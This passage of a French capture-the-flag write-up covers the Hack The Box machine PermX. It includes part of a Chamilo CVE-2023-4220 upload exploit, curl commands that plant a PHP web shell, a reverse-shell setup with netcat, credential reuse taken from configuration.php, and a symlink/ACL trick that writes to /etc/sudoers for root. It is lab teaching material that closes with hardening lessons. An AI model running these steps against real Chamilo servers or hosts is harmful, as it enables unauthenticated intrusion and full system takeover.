    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit")
    parser.add_argument('target_url', help="The target base URL of the Chamilo LMS instance (e.g., http://example.com/)")
    parser.add_argument('cmd', help="The command to execute on the remote server")
    parser.add_argument('--shell', default='rce.php', help="The name of the shell file to be uploaded (default: rce.php)")

    args = parser.parse_args()

    # Run the exploit with the provided arguments
    upload_shell(args.target_url, args.shell)

    # Form the shell URL to execute commands
    shell_url = urljoin(args.target_url, f"main/inc/lib/javascript/bigupload/files/{args.shell}")
    execute_command(shell_url, args.cmd)
```

L’analyse du script montre qu’il exploite une vulnérabilité d’**upload de fichier non restreint** dans Chamilo.

La fonction `upload_shell` envoie un fichier PHP via une requête HTTP vers l’endpoint :

```python
/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
```

Aucune authentification n’est requise, et le fichier est accepté tel quel.

Une fois uploadé, le fichier est stocké dans le répertoire :

```python
/main/inc/lib/javascript/bigupload/files/
```

Ce répertoire étant accessible depuis le web, le fichier PHP peut être exécuté directement par le serveur.

Cette vulnérabilité permet une **exécution de commandes à distance (RCE)** sous l’utilisateur `www-data`, sans authentification.

Tu peux donc exécuter des commandes directement sur la machine cible.

Tu commences par réaliser un **Proof of Concept** simple en exécutant la commande `id`, avant d’exploiter cette RCE pour obtenir un reverse shell.

### Proof of Concept — Exécution de la commande `id`

Pour valider concrètement l’exécution de code à distance, tu commences par créer un fichier PHP très simple contenant une seule commande système. L’objectif est uniquement de vérifier si le code PHP est bien exécuté côté serveur.

```bash
echo '<?php system("id"); ?>' > rce.php
```

Ce fichier contient une instruction PHP qui exécute la commande `id`, suffisante pour identifier l’utilisateur sous lequel le code s’exécute.

Tu uploades ensuite ce fichier à l’aide d’une requête `curl -F`, en utilisant le champ `bigUploadFile` attendu par l’application. L’option `@rce.php` indique à `curl` d’envoyer le contenu du fichier, comme lors d’un upload via un formulaire web.

```bash
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

```bash
The file has successfully been uploaded. 
```



Le message *“The file has successfully been uploaded.”* confirme que le serveur accepte l’upload sans authentification et sans filtrage sur l’extension du fichier.



![Index du répertoire bigupload montrant le fichier rce.php uploadé et accessible via le web](bigupload-files.png)

Une fois l’upload effectué, tu accèdes directement au fichier PHP via son emplacement dans le répertoire d’upload, accessible depuis le navigateur.

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



La réponse renvoyée par le serveur affiche le résultat de la commande `id`, ce qui confirme que le fichier PHP est bien interprété et exécuté côté serveur. La commande s’exécute sous l’utilisateur `www-data`, correspondant au compte du serveur web. Cette sortie valide l’exécution de commandes à distance sans authentification et fournit une base solide pour passer à l’obtention d’un reverse shell.



### Obtention du reverse shell

Pour obtenir un accès interactif, tu utilises un reverse shell PHP.
 Un choix classique en CTF est le reverse shell **Pentestmonkey**, simple et éprouvé.

Tu le récupères depuis le dépôt officiel :

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Avant de l’utiliser, tu modifies le fichier pour y renseigner ton adresse IP (tun0) ainsi que le port d’écoute.

Remplace :

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

par :

```php
$ip   = '10.10.14.xx';  // ton IP tun0
$port = 4444;           // ton port d'écoute
```

Une fois le payload adapté, tu l’uploades de la même manière que lors du Proof of Concept.

L’endpoint vulnérable accepte toujours les fichiers envoyés via le champ `bigUploadFile`, ce qui permet d’envoyer le reverse shell sans authentification.

```bash
curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```



Avant de déclencher le reverse shell, tu mets en place un **listener** sur ta machine pour recevoir la connexion entrante.

Sur ta machine Kali, lance `netcat` en écoute sur le port défini dans le payload :

```
nc -lvnp 4444
```



Une fois le listener prêt, il suffit d’exécuter le fichier PHP uploadé pour déclencher la connexion.

Tu peux le faire directement via le navigateur ou avec `curl` :



```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
```

Le serveur interprète alors le fichier PHP et initie une connexion vers ta machine.

```bash
nc -lvnp 4444             
Listening on 0.0.0.0 4444
Connection received on 10.129.x.x 37198
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 09:55:11 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$  whoami
www-data
$
```

Tu obtiens ainsi un shell en tant que `www-data`, confirmant le succès de l’exploitation.

### Consolidation du Shell

Une fois le reverse shell obtenu, il est recommandé de le stabiliser afin de travailler plus confortablement. Cette étape permet d’obtenir un shell interactif plus fiable, avec une meilleure gestion du clavier et des commandes.

Pour cette phase, tu peux t’appuyer sur la recette dédiée :
 {{< recette "stabiliser-reverse-shell" >}}

Elle décrit une technique classique pour consolider un reverse shell et préparer la suite de l’exploitation dans de bonnes conditions.

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@permx:/$ 

www-data@permx:/$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                       
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm 
www-data@permx:/$ stty cols 132 rows 34
www-data@permx:/$ 
```

### Identification de l’utilisateur associé au flag user.txt

#### Lister les utilisateurs présents

Tu commences par identifier les comptes utilisateurs présents sur la machine :

```bash
ls -l /home
total 4
drwxr-x--- 4 mtz mtz 4096 Jun  6  2024 mtz
```

Un seul répertoire utilisateur est présent : `mtz`.

#### Rechercher le flag `user.txt`

Tu vérifies ensuite si le flag est directement accessible :

```bash
find /home -name user.txt 2>/dev/null
```

Aucun résultat n’est retourné.

Dans un contexte CTF, cette situation est classique : le flag est généralement stocké dans le répertoire personnel d’un utilisateur.

Ici, la présence unique de `mtz` indique que le fichier `user.txt` se trouve très probablement dans `/home/mtz`, mais qu’il n’est pas accessible avec les droits actuels.

L’objectif devient donc d’obtenir un accès au compte `mtz` afin de pouvoir lire ce fichier.

### Accès à l’utilisateur mtz via les identifiants Chamilo

Après avoir identifié `mtz` comme l’unique utilisateur du système et propriétaire probable du flag `user.txt`, tu cherches un moyen d’obtenir ses identifiants.

L’application Chamilo constitue ici une piste intéressante, car elle contient des informations sensibles dans ses fichiers de configuration.

La documentation accessible sur `http://lms.permx.htb/documentation` indique que les paramètres de configuration sont stockés dans le fichier :

```bash
main/inc/conf/configuration.php
```

![Documentation Chamilo indiquant l’emplacement du fichier configuration.php contenant les paramètres sensibles](localisation-configuration-php.png)



En consultant ce fichier, tu récupères les identifiants de connexion à la base de données :

```php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

Le mot de passe est stocké en clair.

Dans un contexte CTF, il est courant que ce type de mot de passe soit réutilisé pour d’autres comptes.

Tu testes donc ce mot de passe avec l’utilisateur `mtz` :

```bash
su mtz
Password: 
mtz@permx:/$ whoami
mtz
mtz@permx:/$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
mtz@permx:/$ 
```



L’authentification réussit.

Tu disposes désormais des identifiants `mtz:03F6lY3uXAP2bkW8`, ce qui te permet d’accéder au compte utilisateur et de poursuivre l’exploitation.

### user.txt

L’accès au compte `mtz` est confirmé.

Le fichier `user.txt`, présent dans son répertoire personnel, est désormais accessible.

```bash
mtz@permx:/$ pwd
/
mtz@permx:/$ ls -l ~
total 4
-rw-r----- 1 root mtz 33 Feb  9 08:31 user.txt
mtz@permx:/$ cat ~/user.txt
0a73xxxxxxxxxxxxxxxxxxxxxxxxf725
```

Après avoir obtenu un accès au compte `mtz` et récupéré le flag utilisateur, l’étape suivante consiste à identifier une élévation de privilèges vers root.


## Escalade de privilèges

{{< escalade-intro user="mtz" >}}
### Sudo -l

Tu commences toujours par vérifier les droits <code>sudo</code> :


```bash
sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

La commande `sudo -l` indique que l’utilisateur `mtz` peut exécuter le script **`/opt/acl.sh`** en tant que **root**, sans mot de passe.

Ce script constitue donc une piste directe pour une **élévation de privilèges**.

### Analyse de /opt/acl.sh

Tu poursuis l’analyse en examinant le script **`/opt/acl.sh`**, exécutable avec les privilèges root via `sudo`.

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```



Le script `/opt/acl.sh` te permet d’ajouter des permissions **ACL** (*Access Control Lists*) sur un fichier placé sous `/home/mtz/`.

Les ACL permettent d’attribuer des droits précis (lecture, écriture, exécution) à un utilisateur donné, en complément des permissions Unix classiques.

Par exemple, la commande suivante donne le droit d’écriture à l’utilisateur `mtz` sur un fichier sans en être le propriétaire :

```
setfacl -m u:mtz:rw fichier
```

Le script ne vérifie que le chemin fourni, sans résoudre sa destination réelle.

En utilisant un **lien symbolique**, tu peux donc faire pointer ce fichier vers une cible sensible du système.

Comme `setfacl` est exécuté avec les privilèges **root**, les permissions sont alors appliquées directement sur cette cible.

Cette faiblesse permet une **élévation de privilèges** via un lien symbolique.



> *Note : pour une présentation détaillée des ACL Linux (en français), voir la documentation Ubuntu-fr*
>   https://doc.ubuntu-fr.org/acl



### Exploitation de la vulnérabilité



#### Choix du fichier cible

L’étape suivante consiste à choisir le **fichier système le plus pertinent** à cibler, afin d’exploiter efficacement cette possibilité de modification des ACL et d’aboutir à une élévation de privilèges fiable.

Plusieurs fichiers système peuvent théoriquement être ciblés via la modification des ACL, comme `/etc/passwd`, `/root/.ssh/authorized_keys` ou encore `/etc/sudoers`.

Parmi ces options, **`/etc/sudoers`** est le choix le plus pertinent : il permet une élévation de privilèges **directe, contrôlée et réversible**, sans compromettre la stabilité du système.

**Tu vas donc exploiter cette possibilité en ciblant le fichier `/etc/sudoers` afin d’obtenir un accès root.**

#### Script d'exécution

En travaillant dans le répertoire personnel de `mtz`, tu constates assez rapidement qu’une **tâche cron** supprime régulièrement les **liens symboliques récemment créés** dans `/home/mtz`.

Pour contourner ce nettoyage automatique, une bonne approche consiste à regrouper toutes les étapes (création du lien symbolique, application des ACL, modification du fichier ciblé) dans un **script unique** `shell.sh`, que tu peux exécuter d’un seul tenant et relancer si nécessaire.



```bash
#!/bin/bash

rm -f /home/mtz/sudoers_link
ln -s /etc/sudoers /home/mtz/sudoers_link

sudo /opt/acl.sh mtz rwx /home/mtz/sudoers_link

echo "mtz ALL=(ALL) NOPASSWD: ALL" | tee -a /home/mtz/sudoers_link

sudo -l

sudo -i

```

Le script `shell.sh` automatise l’exploitation en une seule exécution afin de devancer le nettoyage par cron.

Le script crée un lien symbolique vers `/etc/sudoers`, applique des **droits d’écriture via ACL** à l’aide de `/opt/acl.sh`, puis ajoute une règle `sudo` permettant à `mtz` d’exécuter des commandes **sans mot de passe**.

La modification est immédiatement visible avec `sudo -l`, avant d’obtenir un **shell root** via `sudo -i`.



```bash
mtz@permx:~$ chmod +x shell.sh
mtz@permx:~$ ./shell.sh

[+] Création du lien symbolique vers /etc/sudoers
[+] Application des ACL via /opt/acl.sh
[+] Ajout de la règle sudo pour mtz

mtz ALL=(ALL) NOPASSWD: ALL

[+] Vérification des droits sudo

Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
    (ALL) NOPASSWD: ALL

[+] Obtention du shell root

mtz@permx:~$ sudo -i
root@permx:~# whoami
root
root@permx:~#
```

### root.txt

Une fois les privilèges root obtenus, tu peux accéder au flag final situé dans le répertoire `/root` :

```bash
cat /root/root.txt
```

```bash
root@permx:~# cat /root/root.txt
0803xxxxxxxxxxxxxxxxxxxxxxxx24d0
```

Tu as maintenant terminé ce challenge, en obtenant un accès initial puis une élévation de privilèges complète jusqu’à root.


## Conclusion

PermX illustre comment une vulnérabilité web peut mener à une compromission complète du système.

L’exploitation commence par une **RCE sur Chamilo via un upload de fichier**, permettant d’obtenir un premier accès en tant que `www-data`. L’analyse de l’application mène ensuite à la découverte du fichier `configuration.php`, qui expose des **identifiants de base de données stockés en clair**.

Comme souvent en CTF — et en environnement réel — ce mot de passe est **réutilisé**, ce qui permet d’accéder au compte utilisateur `mtz`.

L’escalade de privilèges repose ensuite sur une mauvaise configuration `sudo`, combinée à une utilisation dangereuse des **ACL**, permettant de modifier des fichiers sensibles via un lien symbolique et d’obtenir un accès root.

Plusieurs enseignements ressortent de ce challenge :

- protéger les fichiers de configuration contenant des informations sensibles ;
- ne jamais réutiliser un mot de passe entre différents services ;
- contrôler strictement les scripts exécutables via `sudo` ;
- se méfier des mécanismes comme les ACL lorsqu’ils sont mal encadrés.

Une faiblesse isolée peut sembler anodine. Combinée à d’autres, elle devient critique.

Le compromis final repose sur un enchaînement clair :
**RCE Chamilo → fuite de configuration → réutilisation d’identifiants → mauvaise configuration sudo/ACL → root**.

---

{{< feedback >}}

